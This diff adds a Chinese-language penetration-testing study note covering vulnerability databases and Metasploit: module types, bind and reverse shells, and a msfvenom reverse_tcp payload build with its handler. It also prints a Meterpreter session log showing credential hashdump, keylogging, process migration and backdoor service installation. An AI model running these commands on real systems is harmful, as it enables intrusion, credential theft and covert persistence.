@@ -1,0 +1,109 @@
+[exploit code development](http://www.phreedom.org/presentations/exploit-code-development/exploit-code-development.pdf)
+
+资料库名称| 网址
+---|---
+Bugtraq SecurityFocus   | https://www.securityfocus.com/
+OSVDB Vulnerabilities   | http://osvdb.org
+Packet Storm            | http://www.packetstormsecurity.org
+VUPEN Security          | http://www.vupen.com
+National Vulnerability Database | http://nvd.nist.gov
+ISS X-Force             | http://xforce.iss.net
+US-CERT Vulnerability Notes     | http://www.kb.cert.org/vuls
+Hack0wn                 | http://www.hack0wn.com
+
+kali集成了由“Offensive Security”提供的资料库，可在您的系统上保存exploit的所有漏洞记录，以便日后参考和使用。如需查看Exploit-DB提供的资料，可执行下述命令：
+```
+# cd /usr/share/exploitdb/
+# less -N files.csv
+```
+---
+### Metasploit
+大体分为下述模块
+- exploit(漏洞利用程序模板)  
+    包含各种POC验证程序，用于验证利用特定漏洞（exploit）的可行性
+- payload（有效荷载模板）  
+    包含各种恶意程序，用于再目标系统上运行任意命令
+- Auxiliaries（辅助工具模板）  
+    包含一些列的扫描、嗅探、拨号测试、指纹识别和其他类型的安全评估程序
+- Encoders（编码工具模板）  
+    在渗透测试中，这个模板用来加密有效荷载，以避免被杀毒软件，防火墙，IDS/IPS以其他类似的反恶意软件检测出来
+- NOP（空操作模板）  
+    这个模板用于在shellcode中插入NOP（汇编指令）。虽然NOP不会进行实际的操作，但是可在构造shellcode时用来暂时替代payload，形成完整的shellcode程序  
+
+payload:  
+- bind shell  
+    bind(绑定型)shell用于提供远程shell连接，主要是用于无法从被测主机直接连接到攻击人员主机IP的各种情况
+- reverse shell  
+    reverse（反射型）shell与绑定型（bind）shell不同，reverse shell不是在目标主机上绑定端口，被动地受理攻击人员地机器连接，而是采用反弹的方法，让被测主机主动地连接攻击者地IP和端口，并提供一个shell。
+- Meterpreter  
+    Meterpreter是一种先进的、隐蔽的、多功能的、可动态扩展的payload。它可在目标主机的系统内存中注入DLL（注入的DLL完全不会以文件形式存在）。此外它还支持在运行期间加载脚本和插件。
+```
+inline payload和staged payload的区别有哪些
+inline payload属于自主型shellcode，它的shellcode和exploit都在同一个程序文件里。而staged payload在两台主机之间建立通信隧道，并通过隧道执行shellcode程序。如果对payload的文件尺寸有严格要求，可使用staged payload，因为它的文件比inline payload小得多。
+```
+
+[msfvendom](http://blog.csdn.net/lzhd24/article/details/50664342)
+```
+msfvendom生成payload：
+root@kali:~# msfvenom -p windows/vncinject/reverse_tcp LHOST=192.168.72.130 -f exe -o vnc_payload.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+Saved as: vnc_payload.exe
+
+...
+
+启动msfconsole：
+msf > use exploit/multi/handler 
+msf exploit(multi/handler) > set payload windows/vncinject/reverse_tcp
+msf exploit(multi/handler) > set lhost 192.168.72.130
+msf exploit(multi/handler) > exploit 
+...
+
+在目标系统上运行vnc_payload.exe即可
+```
+
+meterpreter:
+```
+meterpreter > getuid 
+Server username: WIN-6JQQSHON7AM\zz
+
+meterpreter > migrate -N explorer.exe       # 将程序插入explorer.exe进程中
+[*] Migrating from 3696 to 1856...
+[*] Migration completed successfully.
+
+meterpreter > run hashdump                  # 获取被测主机的账户密码信息
+
+meterpreter > keyscan_start                 # 键盘记录启动
+Starting the keystroke sniffer ...
+
+meterpreter > keyscan_dump                  # 获取键盘录入信息
+Dumping captured keystrokes...
+<Left Windows>notepad<CR>
+biewanle<^H><^H><^H><^H><^H><^H><^H><^H><^H>
+
+meterpreter > keyscan_stop                  # 键盘记录停止
+Stopping the keystroke sniffer...
+
+meterpreter > run metsvc                    # 上传后门
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
+[*] Creating a meterpreter service on port 31337
+[*] Creating a temporary installation directory C:\Users\zz\AppData\Local\Temp\RijMoQIkvUpu...
+[*]  >> Uploading metsrv.x86.dll...
+[*]  >> Uploading metsvc-server.exe...
+[*]  >> Uploading metsvc.exe...
+[*] Starting the service...
+
+
+```
+
+### MSFCLI
+    MSFCLI和MSFConsole相似，它们不仅采用了命令行界面，而且都可在所有的线程中操作绝大多数的模板。然而MSFCLI的自动化程度没有MSFConsole高  
+```
+# msfcli -h
+```
+
